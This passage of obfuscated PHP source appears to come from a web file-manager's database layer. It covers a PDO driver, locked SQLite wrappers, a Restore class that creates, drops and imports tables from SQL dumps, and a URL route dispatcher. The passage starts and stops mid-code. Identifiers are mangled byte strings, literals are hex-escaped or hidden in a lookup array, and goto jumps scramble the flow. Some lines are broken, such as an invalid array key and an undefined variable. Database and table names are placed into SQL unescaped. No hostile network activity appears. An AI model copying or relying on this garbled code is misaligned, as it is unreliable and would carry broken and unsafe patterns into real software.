a∂ú„…¶ç»: } public function getTables($BàÜÀ“ û∞ = '') { $Cæë√ÑÍŸá =& $_SERVER[£¿ÌÙëü¡¯¯]; if (think_config($Cæë√ÑÍŸá[860])) { $CûÎè∏ÎÇË = str_replace($Cæë√ÑÍŸá[861], $BàÜÀ“ û∞, think_config($Cæë√ÑÍŸá[860])); } else { switch ($this->dbType) { case $Cæë√ÑÍŸá[828]: case $Cæë√ÑÍŸá[830]: $CûÎè∏ÎÇË = $Cæë√ÑÍŸá[862]; break; case $Cæë√ÑÍŸá[827]: case $Cæë√ÑÍŸá[845]: $CûÎè∏ÎÇË = $Cæë√ÑÍŸá[863]; break; case $Cæë√ÑÍŸá[854]: $CûÎè∏ÎÇË = $Cæë√ÑÍŸá[864]; break; case $Cæë√ÑÍŸá[829]: think_exception(think_lang($Cæë√ÑÍŸá[865]) . $Cæë√ÑÍŸá[866]); break; case $Cæë√ÑÍŸá[846]: $CûÎè∏ÎÇË = $Cæë√ÑÍŸá[42] . $Cæë√ÑÍŸá[43] . $Cæë√ÑÍŸá[44]; break; case $Cæë√ÑÍŸá[857]: default: if (!empty($BàÜÀ“ û∞)) { $CûÎè∏ÎÇË = $Cæë√ÑÍŸá[809] . $BàÜÀ“ û∞; } else { $CûÎè∏ÎÇË = $Cæë√ÑÍŸá[810]; } } } $b™–®Ìü¶Ö = $this->query($CûÎè∏ÎÇË); $e˘”ºç«Ë– = array(); foreach ($b™–®Ìü¶Ö as $fâ¥êàÉ¨é => $böü∞´µÕÓ) { $e˘”ºç«Ë–[$fâ¥êàÉ¨é] = current($böü∞´µÕÓ); } return $e˘”ºç«Ë–; } protected function parseLimit($c®ûéä√“ñ) { $BõöØ∞¢ÕΩ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FÁÍä«ıââ = $BõöØ∞¢ÕΩ[33]; if (!empty($c®ûéä√“ñ)) { switch ($this->dbType) { case $BõöØ∞¢ÕΩ[854]: case $BõöØ∞¢ÕΩ[846]: $c®ûéä√“ñ = explode($BõöØ∞¢ÕΩ[47], $c®ûéä√“ñ); if (count($c®ûéä√“ñ) > 1) { $FÁÍä«ıââ .= $BõöØ∞¢ÕΩ[48] . $c®ûéä√“ñ[1] . $BõöØ∞¢ÕΩ[49] . $c®ûéä√“ñ[0] . $BõöØ∞¢ÕΩ[50]; } else { $FÁÍä«ıââ .= $BõöØ∞¢ÕΩ[48] . $c®ûéä√“ñ[0] . $BõöØ∞¢ÕΩ[50]; } break; case $BõöØ∞¢ÕΩ[827]: case $BõöØ∞¢ÕΩ[845]: break; case $BõöØ∞¢ÕΩ[829]: break; case $BõöØ∞¢ÕΩ[828]: case $BõöØ∞¢ÕΩ[830]: break; case $BõöØ∞¢ÕΩ[857]: default: $FÁÍä«ıââ .= $BõöØ∞¢ÕΩ[48] . $c®ûéä√“ñ . $BõöØ∞¢ÕΩ[50]; } } return $FÁÍä«ıââ; } public function parseKey(&$Dü•ø◊â°ƒ, $Aä—Âœº¨ù = true) { $E–ëà⁄›™ﬁ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($Aä—Âœº¨ù) { $Dü•ø◊â°ƒ = $this->parseKeyCheck($Dü•ø◊â°ƒ); } if ($this->dbType == $E–ëà⁄›™ﬁ[857]) { if ($Dü•ø◊â°ƒ != $E–ëà⁄›™ﬁ[173] && !preg_match($E–ëà⁄›™ﬁ[820], $Dü•ø◊â°ƒ)) { $Dü•ø◊â°ƒ = $E–ëà⁄›™ﬁ[821] . trim($Dü•ø◊â°ƒ, $E–ëà⁄›™ﬁ[821]) . $E–ëà⁄›™ﬁ[821]; } return $Dü•ø◊â°ƒ; } else { return parent::parseKey($Dü•ø◊â°ƒ); } } public function close() { $this->_linkID = null; } public function error() { $eÒ∞îÃ√Îñ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($this->PDOStatement) { $E⁄«ƒÎ∏ùË = $this->PDOStatement->errorInfo(); $this->error = $E⁄«ƒÎ∏ùË[1] . $eÒ∞îÃ√Îñ[4] . $E⁄«ƒÎ∏ùË[2]; } else { $this->error = $eÒ∞îÃ√Îñ[33]; } if ($eÒ∞îÃ√Îñ[33] != $this->queryStr) { $this->error .= LNG($eÒ∞îÃ√Îñ[45]) . $this->queryStr; } think_trace($this->error, $eÒ∞îÃ√Îñ[33], $eÒ∞îÃ√Îñ[46]); return $this->error; } public function escapeString($dÿÒê„ü©Æ) { $bƒïî‹¯ÿ  =& $_SERVER[£¿ÌÙëü¡¯¯]; switch ($this->dbType) { case $bƒïî‹¯ÿ [854]: case $bƒïî‹¯ÿ [827]: case $bƒïî‹¯ÿ [845]: case $bƒïî‹¯ÿ [857]: return addslashes($dÿÒê„ü©Æ); case $bƒïî‹¯ÿ [829]: case $bƒïî‹¯ÿ [846]: case $bƒïî‹¯ÿ [828]: case $bƒïî‹¯ÿ [830]: return str_ireplace($bƒïî‹¯ÿ [55], $bƒïî‹¯ÿ [56], $dÿÒê„ü©Æ); } } protected function parseValue($Fé‘‚ü≤Ÿœ) { $e√±ÃÛﬂöÏ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (is_string($Fé‘‚ü≤Ÿœ)) { $Fé‘‚ü≤Ÿœ = strpos($Fé‘‚ü≤Ÿœ, $e√±ÃÛﬂöÏ[4]) === 0 ? $this->escapeString($Fé‘‚ü≤Ÿœ) : $e√±ÃÛﬂöÏ[867] . $this->escapeString($Fé‘‚ü≤Ÿœ) . $e√±ÃÛﬂöÏ[867]; } elseif (isset($Fé‘‚ü≤Ÿœ[0]) && is_string($Fé‘‚ü≤Ÿœ[0]) && strtolower($Fé‘‚ü≤Ÿœ[0]) == $e√±ÃÛﬂöÏ[282]) { $Fé‘‚ü≤Ÿœ = $this->escapeString($Fé‘‚ü≤Ÿœ[1]); } elseif (is_array($Fé‘‚ü≤Ÿœ)) { $Fé‘‚ü≤Ÿœ = array_map(array($this, $e√±ÃÛﬂöÏ[868]), $Fé‘‚ü≤Ÿœ); } elseif (is_bool($Fé‘‚ü≤Ÿœ)) { $Fé‘‚ü≤Ÿœ = $Fé‘‚ü≤Ÿœ ? $e√±ÃÛﬂöÏ[84] : $e√±ÃÛﬂöÏ[464]; } elseif (is_null($Fé‘‚ü≤Ÿœ)) { $Fé‘‚ü≤Ÿœ = $e√±ÃÛﬂöÏ[102]; } return $Fé‘‚ü≤Ÿœ; } public function getLastInsertId() { $fÂÍëÃ∆Æ¢ =& $_SERVER[£¿ÌÙëü¡¯¯]; switch ($this->dbType) { case $fÂÍëÃ∆Æ¢[854]: case $fÂÍëÃ∆Æ¢[846]: case $fÂÍëÃ∆Æ¢[827]: case $fÂÍëÃ∆Æ¢[845]: case $fÂÍëÃ∆Æ¢[829]: case $fÂÍëÃ∆Æ¢[857]: return $this->_linkID->lastInsertId(); case $fÂÍëÃ∆Æ¢[828]: case $fÂÍëÃ∆Æ¢[830]: $B´”„Ü¥≤ï = $this->table; $fÁèà∏Ï¥è = $this->query("\x53\105\x4c\105\x43\x54\x20{$B´”„Ü¥≤ï}\x2e\143\165\x72\x72\166\x61\154\x20\x63\165\162\162\x76\141\x6c\x20\106\x52\x4f\115\40\144\165\x61\154"); return $fÁèà∏Ï¥è ? $fÁèà∏Ï¥è[0][$fÂÍëÃ∆Æ¢[869]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($D¢·çÀ• Æ) { goto eßâ∫∞éÏÈ; eßâ∫∞éÏÈ: $DÜ€ì–â«• =& $_SERVER[£¿ÌÙëü¡¯¯]; $d›√ëÂ∫¶ü = DATA_PATH . $DÜ€ì–â«•[870]; $EÇèÏÊ¿äŸ = fopen($d›√ëÂ∫¶ü, $DÜ€ì–â«•[871]); goto Fíü›´ßüı; Fíü›´ßüı: if (!$EÇèÏÊ¿äŸ) { return !1; } if (flock($EÇèÏÊ¿äŸ, LOCK_EX)) { $aîåçü≠∑í = parent::query($D¢·çÀ• Æ); flock($EÇèÏÊ¿äŸ, LOCK_UN); fclose($EÇèÏÊ¿äŸ); return $aîåçü≠∑í; } flock($EÇèÏÊ¿äŸ, LOCK_UN); goto Bì„ÈÓ≤Ûù; Bì„ÈÓ≤Ûù: fclose($EÇèÏÊ¿äŸ); show_json($DÜ€ì–â«•[872], !1); return !1; goto FïçØ∫ÇÒË; FïçØ∫ÇÒË: } public function execute($BòΩ”œæ∞∞) { goto aû¿åÈ≈Éﬂ; Fß›Ò√ûë…: fclose($Eπ≈¨Üîç¨); show_json($EÓ‚çÎ¬çº[872], !1); return !1; goto Fù‹Àú≥£ä; a›ãïª¯∏≈: if (!$Eπ≈¨Üîç¨) { return !1; } if (flock($Eπ≈¨Üîç¨, LOCK_EX)) { $aÎÎºëåÌÛ = parent::execute($BòΩ”œæ∞∞); flock($Eπ≈¨Üîç¨, LOCK_UN); fclose($Eπ≈¨Üîç¨); return $aÎÎºëåÌÛ; } flock($Eπ≈¨Üîç¨, LOCK_UN); goto Fß›Ò√ûë…; aû¿åÈ≈Éﬂ: $EÓ‚çÎ¬çº =& $_SERVER[£¿ÌÙëü¡¯¯]; $FÜß¡ß‚°ô = DATA_PATH . $EÓ‚çÎ¬çº[870]; $Eπ≈¨Üîç¨ = fopen($FÜß¡ß‚°ô, $EÓ‚çÎ¬çº[871]); goto a›ãïª¯∏≈; Fù‹Àú≥£ä: } } class DbSqlite3 extends DbSqlite3Base { public function query($eª£¬€çÜπ) { goto fª÷≈¬Îí‘; fª÷≈¬Îí‘: $DÈ÷∞®Íﬂó =& $_SERVER[£¿ÌÙëü¡¯¯]; $CÛ¡Ô∑•Òœ = DATA_PATH . $DÈ÷∞®Íﬂó[870]; $fıØ›ä≈ˆ◊ = fopen($CÛ¡Ô∑•Òœ, $DÈ÷∞®Íﬂó[871]); goto dàÑÌÓñ›‚; dàÑÌÓñ›‚: if (!$fıØ›ä≈ˆ◊) { return !1; } if (flock($fıØ›ä≈ˆ◊, LOCK_EX)) { $A∆∫Ÿá£¡ø = parent::query($eª£¬€çÜπ); flock($fıØ›ä≈ˆ◊, LOCK_UN); fclose($fıØ›ä≈ˆ◊); return $A∆∫Ÿá£¡ø; } flock($fıØ›ä≈ˆ◊, LOCK_UN); goto bµØê´ƒà≤; bµØê´ƒà≤: fclose($fıØ›ä≈ˆ◊); show_json($DÈ÷∞®Íﬂó[872], !1); return !1; goto Dâ‹íÿ„÷ˆ; Dâ‹íÿ„÷ˆ: } public function execute($FèÉ÷´ôÛƒ) { goto B¬Ë÷Úï∂Ö; B¬Ë÷Úï∂Ö: $DπÏê¢™Âÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aºÿ ıçÉ¿ = DATA_PATH . $DπÏê¢™Âÿ[870]; $c†ÈÊ¬›∏º = fopen($aºÿ ıçÉ¿, $DπÏê¢™Âÿ[871]); goto dÓÍÆ¯£òä; Cì›ÛÍøÉ›: fclose($c†ÈÊ¬›∏º); show_json($DπÏê¢™Âÿ[872], !1); return !1; goto Bù»®™¡éÏ; dÓÍÆ¯£òä: if (!$c†ÈÊ¬›∏º) { return !1; } if (flock($c†ÈÊ¬›∏º, LOCK_EX)) { $CÚª¿ÈÂ∞‡ = parent::execute($FèÉ÷´ôÛƒ); flock($c†ÈÊ¬›∏º, LOCK_UN); fclose($c†ÈÊ¬›∏º); return $CÚª¿ÈÂ∞‡; } flock($c†ÈÊ¬›∏º, LOCK_UN); goto Cì›ÛÍøÉ›; Bù»®™¡éÏ: } } goto cü„◊¥‰éç; a–ÍÒÂ’Ù¬: class Restore { function __construct($béèŒû◊«Û, $B‹Ÿ…Ò†Ö» = '') { $this->database = $béèŒû◊«Û; $this->type = $B‹Ÿ…Ò†Ö»; } public function model($FÇ◊‡Áá¥Ù = '') { return new ModelBase($FÇ◊‡Áá¥Ù, $_SERVER[£¿ÌÙëü¡¯¯][33], $this->database); } public function db($a˜Ìª†ê‚Û = false) { goto Bùè©èõÀ‘; CñÈØ´“ÿÉ: if (!$E∂êßÎØÚ¥) { $bÊã¨«˘íï->execute("\143\162\x65\x61\164\x65\40\x64\141\x74\141\x62\x61\x73\x65\40\x60{$AÔ£üÃ¿µ§}\140"); } $Açıè¯ƒÍ˘[$f€¬Öá±≈Æ[231]] = $AÔ£üÃ¿µ§; if ($Açıè¯ƒÍ˘[$f€¬Öá±≈Æ[720]] == $f€¬Öá±≈Æ[721]) { $Açıè¯ƒÍ˘[$f€¬Öá±≈Æ[723]] .= $f€¬Öá±≈Æ[1289] . $AÔ£üÃ¿µ§; } goto bàãˆí†®ÿ; eÆÔÑÖµÕÖ: $AÔ£üÃ¿µ§ = $Açıè¯ƒÍ˘[$f€¬Öá±≈Æ[231]]; $Açıè¯ƒÍ˘[$f€¬Öá±≈Æ[231]] = $f€¬Öá±≈Æ[33]; if ($Açıè¯ƒÍ˘[$f€¬Öá±≈Æ[720]] == $f€¬Öá±≈Æ[721]) { $F÷àÿàıª˘ = $Açıè¯ƒÍ˘[$f€¬Öá±≈Æ[723]]; $Açıè¯ƒÍ˘[$f€¬Öá±≈Æ[723]] = substr($F÷àÿàıª˘, 0, strrpos($F÷àÿàıª˘, $f€¬Öá±≈Æ[1289])); } goto Eîåâ◊ÑÍé; bàãˆí†®ÿ: $this->database = $Açıè¯ƒÍ˘; $bÊã¨«˘íï->execute("\165\x73\145\x20\140{$AÔ£üÃ¿µ§}\x60"); return $bÊã¨«˘íï; goto Føû¿˘±∞˘; Bùè©èõÀ‘: $f€¬Öá±≈Æ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Açıè¯ƒÍ˘ = $this->database; if ($this->type == $f€¬Öá±≈Æ[9] || !$a˜Ìª†ê‚Û) { return $this->model()->db(); } goto eÆÔÑÖµÕÖ; Eîåâ◊ÑÍé: $this->database = $Açıè¯ƒÍ˘; $bÊã¨«˘íï = $this->model()->db(); $E∂êßÎØÚ¥ = $bÊã¨«˘íï->execute("\x73\150\157\x77\40\144\141\x74\141\x62\141\x73\145\x73\x20\x6c\151\153\x65\x20\x27{$AÔ£üÃ¿µ§}\x27"); goto CñÈØ´“ÿÉ; Føû¿˘±∞˘: } public function createTable($E£ Îˆÿëè, $cÉÈæ√Ë ó = null) { $fÿ¯≤ñŸæ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!@file_exists($E£ Îˆÿëè)) { show_json(LNG($fÿ¯≤ñŸæ[1290]), !1); } $Aªùâà‰òÈ = sqlSplit(file_get_contents($E£ Îˆÿëè)); foreach ($Aªùâà‰òÈ as $fÜäà±ø“ÿ) { if ($cÉÈæ√Ë ó) { $f¡–Ò∂†îè = stripos($fÜäà±ø“ÿ, $fÿ¯≤ñŸæ[1291]) === 0; if ($f¡–Ò∂†îè) { $cÉÈæ√Ë ó->task[$fÿ¯≤ñŸæ[1292]] += 1; } } $this->model()->db()->execute($fÜäà±ø“ÿ); if ($cÉÈæ√Ë ó && $f¡–Ò∂†îè) { $bÂË°‡´´ª = $fÿ¯≤ñŸæ[1293]; preg_match($bÂË°‡´´ª, $fÜäà±ø“ÿ, $dŸ≤…ø”ı€); $cÉÈæ√Ë ó->task[$fÿ¯≤ñŸæ[1294]] = trim($B’»Œâ◊¢…[0], $fÿ¯≤ñŸæ[821]); $cÉÈæ√Ë ó->update(1); } } $this->taskToCache($cÉÈæ√Ë ó); } public function insertTable($cÒ‰âÑ¢¬€, $cÁì Ø«†√ = null) { $FËÛÇŸΩ¥à =& $_SERVER[£¿ÌÙëü¡¯¯]; foreach ($cÒ‰âÑ¢¬€ as $cû∆Àß±º) { $C»¥†Áëƒœ = basename($cû∆Àß±º); $C»¥†Áëƒœ = substr($C»¥†Áëƒœ, 0, strrpos($C»¥†Áëƒœ, $FËÛÇŸΩ¥à[94])); if ($cÁì Ø«†√) { $cÁì Ø«†√->task[$FËÛÇŸΩ¥à[1294]] = $C»¥†Áëƒœ; } if (get_filesize($cû∆Àß±º) == 0) { continue; } $CÁ†¿ƒîœã = $this->sqlToDb($cû∆Àß±º, $cÁì Ø«†√); if (!$CÁ†¿ƒîœã) { show_json(LNG($FËÛÇŸΩ¥à[1295]) . "\x5b{$C»¥†Áëƒœ}\x5d", !1); } } $this->taskToCache($cÁì Ø«†√); } public function sqlFromDb($F‹äıÉ—ôÒ, $eô–ä¢⁄âÊ, $c∑¶Âê∫∏â = null) { goto DÎ≠»Üèäå; B∆êù’ÿüÜ: do { $aâ∂ÒÓõàÿ = $eàÑÏÒÉ≠ˆ->field($cıºößÖÜ∆)->order($D¿ƒœÎÏòñ . $d”¬ªƒ§œ◊[708])->selectPage($a·ì¡·âÑà, $D…ûá®≥ñÿ); $fó§⁄ÍçÏπ = !empty($aâ∂ÒÓõàÿ[$d”¬ªƒ§œ◊[350]]) ? $aâ∂ÒÓõàÿ[$d”¬ªƒ§œ◊[350]] : array(); if (!($f¥œ‡ﬂÉÒ° = count($fó§⁄ÍçÏπ))) { break; } if ($c∑¶Âê∫∏â) { $c∑¶Âê∫∏â->task[$d”¬ªƒ§œ◊[1292]] += $f¥œ‡ﬂÉÒ°; } $f´ £ÈÉ ° = array(); foreach ($fó§⁄ÍçÏπ as $d»¥’ãè£) { $f´ £ÈÉ °[] = $d”¬ªƒ§œ◊[711] . $this->sqlEncode($d»¥’ãè£) . $d”¬ªƒ§œ◊[712]; } $cıé©∆ç¥Ö = "\111\116\x53\105\x52\124\40\x49\x4e\124\117\40\x60{$F‹äıÉ—ôÒ}\140\40\50\x60" . implode($d”¬ªƒ§œ◊[713], $cıºößÖÜ∆) . $d”¬ªƒ§œ◊[714]; fwrite($b‰´–ª¬áû, $cıé©∆ç¥Ö . implode($d”¬ªƒ§œ◊[715], $f´ £ÈÉ °) . $d”¬ªƒ§œ◊[68] . PHP_EOL); $D…ûá®≥ñÿ++; $F∆ç§Àåπ± += $f¥œ‡ﬂÉÒ°; if ($c∑¶Âê∫∏â) { $c∑¶Âê∫∏â->update($f¥œ‡ﬂÉÒ°); } } while ($f¥œ‡ﬂÉÒ° == $a·ì¡·âÑà); fclose($b‰´–ª¬áû); return $F∆ç§Àåπ±; goto E∏¿Ï…„ÇÕ; EÆ√±ÕÁãÿ: $F∆ç§Àåπ± = 0; $D…ûá®≥ñÿ = 1; $a·ì¡·âÑà = 500; goto e€…‚ùˆûç; e€…‚ùˆûç: $b‰´–ª¬áû = fopen($eô–ä¢⁄âÊ, $d”¬ªƒ§œ◊[707]); $D¿ƒœÎÏòñ = $eàÑÏÒÉ≠ˆ->getPk(); $cıºößÖÜ∆ = $eàÑÏÒÉ≠ˆ->getDbFields(); goto B∆êù’ÿüÜ; DÎ≠»Üèäå: $d”¬ªƒ§œ◊ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($c∑¶Âê∫∏â) { $c∑¶Âê∫∏â->task[$d”¬ªƒ§œ◊[1294]] = $F‹äıÉ—ôÒ; } $eàÑÏÒÉ≠ˆ = $this->model($F‹äıÉ—ôÒ); goto EÆ√±ÕÁãÿ; E∏¿Ï…„ÇÕ: } public function sqlToDb($eç€åÊê’ƒ, $aπ¥ÈŒ™¡î = null) { goto D¿Ç∑ò”“≤; D¿Ç∑ò”“≤: $B”›„è‰‘ÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FŒûˆÒ∏ºÊ = $this->model()->db(); $A¿ÀÁØÿÇÛ = @fopen($eç€åÊê’ƒ, $B”›„è‰‘ÿ[1296]); goto DŸÛéùÊäù; f∂É†ÓÊÆö: $BÆƒ©üπìà = 500 + 1; while (!feof($A¿ÀÁØÿÇÛ)) { if ($aπ¥ÈŒ™¡î && $fóÒÈ˜≈°© != 0) { $aπ¥ÈŒ™¡î->task[$B”›„è‰‘ÿ[1292]] += 1; } $fóÒÈ˜≈°©++; $d…ÃÛñ£ì≈ = trim(fgets($A¿ÀÁØÿÇÛ)); $cœÛÈøÒ†≥ .= $B”›„è‰‘ÿ[50] . $this->sqlDecode($d…ÃÛñ£ì≈, $this->type); if ($fóÒÈ˜≈°© == $BÆƒ©üπìà) { $cœÛÈøÒ†≥ = rtrim($cœÛÈøÒ†≥, $B”›„è‰‘ÿ[68]); if (!$FŒûˆÒ∏ºÊ->execute($cœÛÈøÒ†≥)) { return !1; } if ($aπ¥ÈŒ™¡î) { $aπ¥ÈŒ™¡î->update($fóÒÈ˜≈°© - 1); } $cœÛÈøÒ†≥ = $B”›„è‰‘ÿ[33]; $fóÒÈ˜≈°© = 0; } } fclose($A¿ÀÁØÿÇÛ); goto b„–˜à°πî; b„–˜à°πî: if ($cœÛÈøÒ†≥) { $cœÛÈøÒ†≥ = rtrim($cœÛÈøÒ†≥, $B”›„è‰‘ÿ[68]); if (!$FŒûˆÒ∏ºÊ->execute($cœÛÈøÒ†≥)) { return !1; } if ($aπ¥ÈŒ™¡î) { $aπ¥ÈŒ™¡î->update($fóÒÈ˜≈°© - 1); } } return !0; goto f◊ñ˜àºº´; DŸÛéùÊäù: if (!$A¿ÀÁØÿÇÛ) { return !1; } $fóÒÈ˜≈°© = 0; $cœÛÈøÒ†≥ = $B”›„è‰‘ÿ[33]; goto f∂É†ÓÊÆö; f◊ñ˜àºº´: } public function dropTable($Cﬂà≠¬Ëéô = null) { $e≤∑Ü√ô¥â = $this->model()->db(); $cÕ¥úªËçå = $Cﬂà≠¬Ëéô ? array($Cﬂà≠¬Ëéô) : $e≤∑Ü√ô¥â->getTables(); if (!$cÕ¥úªËçå) { return; } foreach ($cÕ¥úªËçå as $Cﬂà≠¬Ëéô) { $e≤∑Ü√ô¥â->execute("\144\162\157\160\40\164\141\142\154\x65\x20\151\x66\40\x65\x78\x69\x73\164\x73\x20\x60{$Cﬂà≠¬Ëéô}\140"); } } private function taskToCache($dù«ü·πÚ÷ = null) { $aÃ∞◊„Ω∞‹ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$dù«ü·πÚ÷) { return; } $D¬åª÷âåó = array($aÃ∞◊„Ω∞‹[1294] => $dù«ü·πÚ÷->task[$aÃ∞◊„Ω∞‹[1294]], $aÃ∞◊„Ω∞‹[1292] => $dù«ü·πÚ÷->task[$aÃ∞◊„Ω∞‹[1292]], $aÃ∞◊„Ω∞‹[1297] => $dù«ü·πÚ÷->task[$aÃ∞◊„Ω∞‹[1297]]); if ($D¬åª÷âåó[$aÃ∞◊„Ω∞‹[1292]] == $D¬åª÷âåó[$aÃ∞◊„Ω∞‹[1297]]) { $D¬åª÷âåó[$aÃ∞◊„Ω∞‹[683]] = 1; } Cache::set($aÃ∞◊„Ω∞‹[1298] . $dù«ü·πÚ÷->task[$aÃ∞◊„Ω∞‹[364]], $D¬åª÷âåó); $dù«ü·πÚ÷->end(); } private function sqlEncode($cËãﬂÈ†óß) { $B«·È®ó¥“ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B∞çÑåÊæ◊ = array(); foreach ($cËãﬂÈ†óß as $C ãÀÜµÕì) { if (is_array($C ãÀÜµÕì)) { $C ãÀÜµÕì = json_encode_force($C ãÀÜµÕì); } $C ãÀÜµÕì = addslashes($C ãÀÜµÕì); $C ãÀÜµÕì = str_replace(array($B«·È®ó¥“[716], $B«·È®ó¥“[214]), array($B«·È®ó¥“[717], $B«·È®ó¥“[718]), $C ãÀÜµÕì); $B∞çÑåÊæ◊[] = str_replace($B«·È®ó¥“[55], $B«·È®ó¥“[1299], $C ãÀÜµÕì); } return $B«·È®ó¥“[55] . implode($B«·È®ó¥“[719], $B∞çÑåÊæ◊) . $B«·È®ó¥“[55]; } private function sqlDecode($E¬ÎË±÷ßÇ, $aêÇºÀé£Â) { $e„íõı¨¶ =& $_SERVER[£¿ÌÙëü¡¯¯]; $E¬ÎË±÷ßÇ = str_replace(array($e„íõı¨¶[717], $e„íõı¨¶[718]), array($e„íõı¨¶[716], $e„íõı¨¶[214]), $E¬ÎË±÷ßÇ); if ($aêÇºÀé£Â == $e„íõı¨¶[9]) { $E¬ÎË±÷ßÇ = stripslashes($E¬ÎË±÷ßÇ); } return $E¬ÎË±÷ßÇ; } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\x5b\x5e\x2f\x5d\53", "\72\x6e\x75\155" => "\x5b\x30\x2d\71\135\53", "\72\141\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($D†ôäÓÁı¬, $d«ÑÈ∞Êê§) { $e«≤¡˜ÕßÃ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($D†ôäÓÁı¬ == $e«≤¡˜ÕßÃ[1300]) { $B◊öÀÌ“ÃÍ = array_map($e«≤¡˜ÕßÃ[1301], $d«ÑÈ∞Êê§[0]); $d‡ÎœÑ≈Ùç = strpos($d«ÑÈ∞Êê§[1], $e«≤¡˜ÕßÃ[8]) === 0 ? $d«ÑÈ∞Êê§[1] : $e«≤¡˜ÕßÃ[8] . $d«ÑÈ∞Êê§[1]; $c«∂ÜÑ´´õ = $d«ÑÈ∞Êê§[2]; } else { $B◊öÀÌ“ÃÍ = null; $d‡ÎœÑ≈Ùç = strpos($d«ÑÈ∞Êê§[0], $e«≤¡˜ÕßÃ[8]) === 0 ? $d«ÑÈ∞Êê§[0] : $e«≤¡˜ÕßÃ[8] . $d«ÑÈ∞Êê§[0]; $c«∂ÜÑ´´õ = $d«ÑÈ∞Êê§[1]; } array_push(self::$maps, $B◊öÀÌ“ÃÍ); array_push(self::$routes, $d‡ÎœÑ≈Ùç); array_push(self::$methods, strtoupper($D†ôäÓÁı¬)); array_push(self::$callbacks, $c«∂ÜÑ´´õ); } public static function error($e¶Ö‹Ø…çÍ) { self::$errorCallback = $e¶Ö‹Ø…çÍ; } public static function haltOnMatch($D±∑›õÌﬂ» = true) { self::$halts = $D±∑›õÌﬂ»; } public static function dispatch() { goto aÙ›ê¿©ç ; bÊ∞àéëè®: self::$routes = preg_replace($d∑÷ÿá®¡÷[1048], $d∑÷ÿá®¡÷[8], self::$routes); if (in_array($cµ…Ÿøõƒˆ, self::$routes)) { $C°ƒÌ√Ó¥Á = array_keys(self::$routes, $cµ…Ÿøõƒˆ); foreach ($C°ƒÌ√Ó¥Á as $B‘¿≥÷üæœ) { if (self::$methods[$B‘¿≥÷üæœ] == $eÍ«¥Ô—áª || self::$methods[$B‘¿≥÷üæœ] == $d∑÷ÿá®¡÷[1303] || in_array($eÍ«¥Ô—áª, self::$maps[$B‘¿≥÷üæœ])) { $d“ﬂèπ™Ì… = !0; if (!is_object(self::$callbacks[$B‘¿≥÷üæœ])) { $d‘¿·ä›Âó = explode($d∑÷ÿá®¡÷[8], self::$callbacks[$B‘¿≥÷üæœ]); $B∞ÑÈæÓﬂ„ = end($d‘¿·ä›Âó); $E•®®’ÂüÈ = explode($d∑÷ÿá®¡÷[1304], $B∞ÑÈæÓﬂ„); $bı–∏Ü±ó◊ = new $E•®®’ÂüÈ[0](); $bı–∏Ü±ó◊->{$E•®®’ÂüÈ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$B‘¿≥÷üæœ]); if (self::$halts) { return; } } } } } else { $C≠å÷ª√ÔΩ = 0; foreach (self::$routes as $B‘¿≥÷üæœ) { if (strpos($B‘¿≥÷üæœ, $d∑÷ÿá®¡÷[4]) !== !1) { $B‘¿≥÷üæœ = str_replace($C›»¨®Èê¥, $fåÿÎ≥ç∂·, $B‘¿≥÷üæœ); } if (preg_match($d∑÷ÿá®¡÷[1305] . $B‘¿≥÷üæœ . $d∑÷ÿá®¡÷[1306], $cµ…Ÿøõƒˆ, $eª¡â∆Ñæá)) { if (self::$methods[$C≠å÷ª√ÔΩ] == $eÍ«¥Ô—áª || self::$methods[$C≠å÷ª√ÔΩ] == $d∑÷ÿá®¡÷[1303] || !empty(self::$maps[$C≠å÷ª√ÔΩ]) && in_array($eÍ«¥Ô—áª, self::$maps[$C≠å÷ª√ÔΩ])) { $d“ﬂèπ™Ì… = !0; array_shift($eª¡â∆Ñæá); if (!is_object(self::$callbacks[$C≠å÷ª√ÔΩ])) { $d‘¿·ä›Âó = explode($d∑÷ÿá®¡÷[8], self::$callbacks[$C≠å÷ª√ÔΩ]); $B∞ÑÈæÓﬂ„ = end($d‘¿·ä›Âó); $E•®®’ÂüÈ = explode($d∑÷ÿá®¡÷[1304], $B∞ÑÈæÓﬂ„); $bı–∏Ü±ó◊ = new $E•®®’ÂüÈ[0](); if (!method_exists($bı–∏Ü±ó◊, $E•®®’ÂüÈ[1])) { echo $d∑÷ÿá®¡÷[1307]; } else { call_user_func_array(array($bı–∏Ü±ó◊, $E•®®’ÂüÈ[1]), $eª¡â∆Ñæá); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$C≠å÷ª√ÔΩ], $eª¡â∆Ñæá); if (self::$halts) { return; } } } } $C≠å÷ª√ÔΩ++; } } if ($d“ﬂèπ™Ì… == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $eœä√Ç¨èµ =& $_SERVER[£¿ÌÙëü¡¯¯]; header($_SERVER[$eœä√Ç¨èµ[1308]] . $eœä√Ç¨èµ[1309]); echo $eœä√Ç¨èµ[1310]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$d∑÷ÿá®¡÷[1302]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto D≠„ê©à¥Æ; fÂ¿Úóïåñ: $C›»¨®Èê¥ = array_keys(static::$patterns); $fåÿÎ≥ç∂· = array_values(static::$patterns); $d“ﬂèπ™Ì… = !1; goto bÊ∞àéëè®; aÙ›ê¿©ç : $d∑÷ÿá®¡÷ =& $_SERVER[£¿ÌÙëü¡¯¯]; $cµ…Ÿøõƒˆ = parse_url($_SERVER[$d∑÷ÿá®¡÷[1302]], PHP_URL_PATH); $eÍ«¥Ô—áª = 